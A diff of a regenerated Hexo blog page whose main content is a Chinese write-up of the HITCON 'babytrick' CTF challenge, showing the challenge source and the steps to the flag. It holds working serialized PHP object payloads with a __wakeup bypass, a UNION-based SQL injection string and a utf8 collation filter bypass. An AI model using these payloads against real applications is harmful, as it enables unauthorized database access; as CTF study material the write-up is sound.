@@ -10,7 +10,7 @@
 
     <!--Description-->
     
-        <meta name="description" content="too hard">
+        <meta name="description" content="对未来的最大慷慨，就是把一切都献给现在！">
     
 
     <!--Author-->
@@ -25,9 +25,11 @@
 
     <!--Open Graph Description-->
     
+        <meta property="og:description" content="对未来的最大慷慨，就是把一切都献给现在！">
+    
 
     <!--Open Graph Site Name-->
-    <meta property="og:site_name" content="Hexo">
+    <meta property="og:site_name" content="Luc1fer&#39;blog">
 
     <!--Type page-->
     
@@ -42,7 +44,7 @@
 
     <!-- Title -->
     
-    <title>HITCON-babytrick - Hexo</title>
+    <title>HITCON-babytrick - Luc1fer&#39;blog</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -90,12 +92,6 @@
             <li class="menu-item">
                 <a href="/archives">
                     Archives
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/about.html">
-                    About
                 </a>
             </li>
             
@@ -149,8 +145,6 @@
                 <span class="date">2018-03-23</span>
             
             
-                <a href="#disqus_thread" class="comments">Comments</a>
-            
             
                 <span class="category">
                     <a href="/categories/WP/">WP</a>
@@ -192,7 +186,7 @@ public function __construct($method, $args) {
 
 function show() {
     list($username) = func_get_args();
-    $sql = sprintf(&quot;SELECT * FROM users WHERE username=&#39;%s&#39;&quot;, $username);
+    $sql = sprintf(&quot;SELECT * FROM users WHERE username=&apos;%s&apos;&quot;, $username);
 
     $obj = $this-&gt;__query($sql);
     if ( $obj != false  ) {
@@ -210,14 +204,14 @@ function login() {
     $username = strtolower(trim(mysql_escape_string($username)));
     $password = strtolower(trim(mysql_escape_string($password)));
 
-    $sql = sprintf(&quot;SELECT * FROM users WHERE username=&#39;%s&#39; AND password=&#39;%s&#39;&quot;, $username, $password);
+    $sql = sprintf(&quot;SELECT * FROM users WHERE username=&apos;%s&apos; AND password=&apos;%s&apos;&quot;, $username, $password);
 
-    if ( $username == &#39;orange&#39; || stripos($sql, &#39;orange&#39;) != false ) {
+    if ( $username == &apos;orange&apos; || stripos($sql, &apos;orange&apos;) != false ) {
         $this-&gt;__die(&quot;Orange is so shy. He do not want to see you.&quot;);
     }
 
     $obj = $this-&gt;__query($sql);
-    if ( $obj != false &amp;&amp; $obj-&gt;role == &#39;admin&#39;  ) {
+    if ( $obj != false &amp;&amp; $obj-&gt;role == &apos;admin&apos;  ) {
         $this-&gt;__die(&quot;Hi, Orange! Here is your flag: &quot; . $FLAG);
     } else {
         $this-&gt;__die(&quot;Admin only!&quot;);
@@ -243,12 +237,12 @@ function __conn() {
                 ) CHARACTER SET utf8&quot;;
         $this-&gt;__query($sql, $back=false);
 
-        $sql = &quot;INSERT INTO users VALUES (&#39;orange&#39;, &#39;$db_pass&#39;, &#39;admin&#39;), (&#39;phddaa&#39;, &#39;ddaa&#39;, &#39;user&#39;)&quot;;
+        $sql = &quot;INSERT INTO users VALUES (&apos;orange&apos;, &apos;$db_pass&apos;, &apos;admin&apos;), (&apos;phddaa&apos;, &apos;ddaa&apos;, &apos;user&apos;)&quot;;
         $this-&gt;__query($sql, $back=false);
     } 
 
     mysql_query(&quot;SET names utf8&quot;);
-    mysql_query(&quot;SET sql_mode = &#39;strict_all_tables&#39;&quot;);
+    mysql_query(&quot;SET sql_mode = &apos;strict_all_tables&apos;&quot;);
 }
 
 function __query($sql, $back=true) {
@@ -297,29 +291,29 @@ new HITCON(&quot;source&quot;, array());
 
 下面的是config.php
 &lt;?php
-$db_host = &#39;localhost&#39;;
-$db_name = &#39;babytrick&#39;;
-$db_user = &#39;babytrick&#39;;
-$db_pass = &#39;babytrick1234&#39;;
-$DEBUG = @$_GET[&#39;noggnogg&#39;];
-$FLAG = &quot;HITCON{php 4nd mysq1 are s0 mag1c, isn&#39;t it?}&quot;;
+$db_host = &apos;localhost&apos;;
+$db_name = &apos;babytrick&apos;;
+$db_user = &apos;babytrick&apos;;
+$db_pass = &apos;babytrick1234&apos;;
+$DEBUG = @$_GET[&apos;noggnogg&apos;];
+$FLAG = &quot;HITCON{php 4nd mysq1 are s0 mag1c, isn&apos;t it?}&quot;;
 ?&gt;</code></pre><p>为了在本地更好的复现，修改了部分config.php代码如下：</p>
 <pre><code>&lt;?php
 
-$db_host = &#39;localhost&#39;;
-$db_name = &#39;test1&#39;;
-$db_user = &#39;root&#39;;
-$db_pass = &#39;root&#39;;
+$db_host = &apos;localhost&apos;;
+$db_name = &apos;test1&apos;;
+$db_user = &apos;root&apos;;
+$db_pass = &apos;root&apos;;
 
-$DEBUG = @$_GET[&#39;noggnogg&#39;];
-$FLAG = &quot;HITCON{php 4nd mysq1 are s0 mag1c, isn&#39;t it?}&quot;;
+$DEBUG = @$_GET[&apos;noggnogg&apos;];
+$FLAG = &quot;HITCON{php 4nd mysq1 are s0 mag1c, isn&apos;t it?}&quot;;
 ?&gt;</code></pre><p>分析源码得到ROP链大致为：get参数-&gt;反序列化-&gt;wakeup()-&gt;destruct()。发现现在出现的函数里没有flag的影子，与FLAG有关的在login()函数里</p>
-<pre><code>        $obj = $this-&gt;__query($sql);
-    if ( $obj != false &amp;&amp; $obj-&gt;role == &#39;admin&#39;  ) {
-        $this-&gt;__die(&quot;Hi, Orange! Here is your flag: &quot; . $FLAG);
-    } else {
-        $this-&gt;__die(&quot;Admin only!&quot;);
-    }</code></pre><p>先跟进login()函数查看发现该函数的作用就是将$username和$password带入一条sql语句，在查询之前先进行一次过滤，之后如果查询后的结果满足if判断就可以拿到flag。也就是说我们现在首先要得到username和password的值，再观察代码可以看到conn()函数给出了题目数据库的结构</p>
+<pre><code>    $obj = $this-&gt;__query($sql);
+if ( $obj != false &amp;&amp; $obj-&gt;role == &apos;admin&apos;  ) {
+    $this-&gt;__die(&quot;Hi, Orange! Here is your flag: &quot; . $FLAG);
+} else {
+    $this-&gt;__die(&quot;Admin only!&quot;);
+}</code></pre><p>先跟进login()函数查看发现该函数的作用就是将$username和$password带入一条sql语句，在查询之前先进行一次过滤，之后如果查询后的结果满足if判断就可以拿到flag。也就是说我们现在首先要得到username和password的值，再观察代码可以看到conn()函数给出了题目数据库的结构</p>
 <pre><code>+----------+----------+-------+
 | username | password | role  |
 +----------+----------+-------+
@@ -328,8 +322,8 @@ $FLAG = &quot;HITCON{php 4nd mysq1 are s0 mag1c, isn&#39;t it?}&quot;;
 +----------+----------+-------+</code></pre><p>也就是说我们现在只剩password不知道了。<br>发现show()函数里对传入的参数没有过滤就带入数据库查询，可以在这里尝试注入得到password。</p>
 <p>现在似乎该知道的都知道了，可是发现跟之前的序列化调用路径没有关系啊ε=ε=ε=┏(゜ロ゜;)┛</p>
 <p>再看代码终于在destruct()里找到了这样的代码</p>
-<pre><code>        if (in_array($this-&gt;method, array(&quot;show&quot;, &quot;login&quot;, &quot;source&quot;))) {
-        @call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</code></pre><p>这里限制了$method变量的值必须是这几个中的一种，而这三个又分别对应各自的函数。判断通过后调用回调函数将数组类型的args变量当作参数传入array()中执行method指定的方法。关于回调函数可以参考php_manual的介绍</p>
+<pre><code>if (in_array($this-&gt;method, array(&quot;show&quot;, &quot;login&quot;, &quot;source&quot;))) {
+@call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</code></pre><p>这里限制了$method变量的值必须是这几个中的一种，而这三个又分别对应各自的函数。判断通过后调用回调函数将数组类型的args变量当作参数传入array()中执行method指定的方法。关于回调函数可以参考php_manual的介绍</p>
 <pre><code>&lt;?php
 function foobar($arg, $arg2) {
 echo __FUNCTION__, &quot; got $arg and $arg2\n&quot;;
@@ -362,11 +356,11 @@ public function __construct($method, $args) {
 }
 }
 $method = &quot;show&quot;;
-$args = array(&quot;1&#39; union select password,username,role from users where username=&#39;orange&#39; -- &quot;);
+$args = array(&quot;1&apos; union select password,username,role from users where username=&apos;orange&apos; -- &quot;);
 $a = new HITCON($method,$args);
 echo serialize($a);  
 
-O:6:&quot;HITCON&quot;:3:{s:14:&quot;%00HITCON%00method&quot;;s:4:&quot;show&quot;;s:12:&quot;%00HITCON%00args&quot;;a:1:{i:0;s:77:&quot;1&#39; union select password,username,role from users where username=&#39;orange&#39; -- &quot;;}}</code></pre><p>这里需要注意的是wake_up()对args进行过滤，因此我们要绕过它，把变量的个数设置大于实际个数就可以，还要注意的是私有变量前后会多两个%00长度也多二。知道这些之后就可以得到password了。</p>
+O:6:&quot;HITCON&quot;:3:{s:14:&quot;%00HITCON%00method&quot;;s:4:&quot;show&quot;;s:12:&quot;%00HITCON%00args&quot;;a:1:{i:0;s:77:&quot;1&apos; union select password,username,role from users where username=&apos;orange&apos; -- &quot;;}}</code></pre><p>这里需要注意的是wake_up()对args进行过滤，因此我们要绕过它，把变量的个数设置大于实际个数就可以，还要注意的是私有变量前后会多两个%00长度也多二。知道这些之后就可以得到password了。</p>
 <pre><code>{&quot;msg&quot;:&quot;root is admin&quot;}</code></pre><p>再进行下一步login()：</p>
 <pre><code>    class HITCON{
 private $method;
@@ -377,14 +371,14 @@ public function __construct($method, $args) {
     $this-&gt;args = $args;
 }
     $method = &quot;login&quot;;
-$args = array(&#39;orange&#39;,&#39;root&#39;);
+$args = array(&apos;orange&apos;,&apos;root&apos;);
 $b = new HITCON($method,$args);
 echo serialize($b);
 
 O:6:&quot;HITCON&quot;:3:{s:14:&quot;%00HITCON%00method&quot;;s:5:&quot;login&quot;;s:12:&quot;%00HITCON%00args&quot;;a:2:{i:0;s:6:&quot;orange&quot;;i:1;s:4:&quot;root&quot;;}}</code></pre><p>得到如下结果</p>
 <pre><code>{&quot;msg&quot;:&quot;Orange is so shy. He do not want to see you.&quot;}</code></pre><p>还需要绕过对orange的判断。由于代码中在链接数据库时设置了字符编码为utf8编码，所以尝试字符差异绕过<br>将a替换成Ã、Ä…这里注意替换完之后长度会加一。同理替换e或着其他的字母都行。</p>
 <pre><code>O:6:&quot;HITCON&quot;:3:{s:14:&quot;%00HITCON%00method&quot;;s:5:&quot;login&quot;;s:12:&quot;%00HITCON%00args&quot;;a:2:{i:0;s:7:&quot;orÄnge&quot;;i:1;s:4:&quot;root&quot;;}}</code></pre><p>得到flag</p>
-<pre><code>{&quot;msg&quot;:&quot;Hi, Orange! Here is your flag: HITCON{php 4nd mysq1 are s0 mag1c, isn&#39;t it?}&quot;}</code></pre><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>做题时思路要发散，做题看到反序列化就盯着几个魔法函数不动也不行。</p>
+<pre><code>{&quot;msg&quot;:&quot;Hi, Orange! Here is your flag: HITCON{php 4nd mysq1 are s0 mag1c, isn&apos;t it?}&quot;}</code></pre><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>做题时思路要发散，做题看到反序列化就盯着几个魔法函数不动也不行。</p>
 <p>对于关键的函数一定要好好查查清楚到底啥作用，你问什么是关键函数？一个一个去查手册啊，就像这道题的回调函数，我刚开始看的时候死活找不到怎么把flag和反序列化联系在一起，真的是看的头秃才注意到回调函数/(ㄒoㄒ)/~~。</p>
 <p>构造序列化字符串还不熟，这道题的第二个反序列化做的时候也是没一下想到怎么把username和password传进去，还是自己太菜。</p>
 <h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><blockquote>
@@ -410,16 +404,6 @@ O:6:&quot;HITCON&quot;:3:{s:14:&quot;%00HITCON%00method&quot;;s:5:&quot;login&qu
 
     <!-- Comments -->
     
-    <div class="comments">
-        
-<div id="disqus_thread">
-    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-</div>
-
-
-
-    </div>
-    
 
 </div>
         </section>
@@ -439,7 +423,7 @@ O:6:&quot;HITCON&quot;:3:{s:14:&quot;%00HITCON%00method&quot;;s:5:&quot;login&qu
             <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                 <h2>About</h2>
                 <p>
-                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                    This theme was developed by <a href="">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                 </p>
             </div>
             
@@ -460,7 +444,7 @@ O:6:&quot;HITCON&quot;:3:{s:14:&quot;%00HITCON%00method&quot;;s:5:&quot;login&qu
             </li>
             
             <li>
-                <a class="footer-post" href="/2019/08/19/Black_magic/">black_magic</a>
+                <a class="footer-post" href="/2019/08/19/Black-magic/">black_magic</a>
             </li>
             
         </ul>
@@ -478,11 +462,11 @@ O:6:&quot;HITCON&quot;:3:{s:14:&quot;%00HITCON%00method&quot;;s:5:&quot;login&qu
         </li>
         
         <li>
-            <a class="footer-post" href="/categories/wp/">wp</a>
+            <a class="footer-post" href="/categories/docker/">docker</a>
         </li>
         
         <li>
-            <a class="footer-post" href="/categories/docker/">docker</a>
+            <a class="footer-post" href="/categories/wp/">wp</a>
         </li>
         
         <li>
@@ -558,18 +542,6 @@ O:6:&quot;HITCON&quot;:3:{s:14:&quot;%00HITCON%00method&quot;;s:5:&quot;login&qu
 <script src="/js/main.js"></script>
 
 <!-- Disqus Comments -->
-
-<script type="text/javascript">
-    var disqus_shortname = 'klugjotest';
-
-    (function(){
-        var dsq = document.createElement('script');
-        dsq.type = 'text/javascript';
-        dsq.async = true;
-        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    }());
-</script>
 
 
 
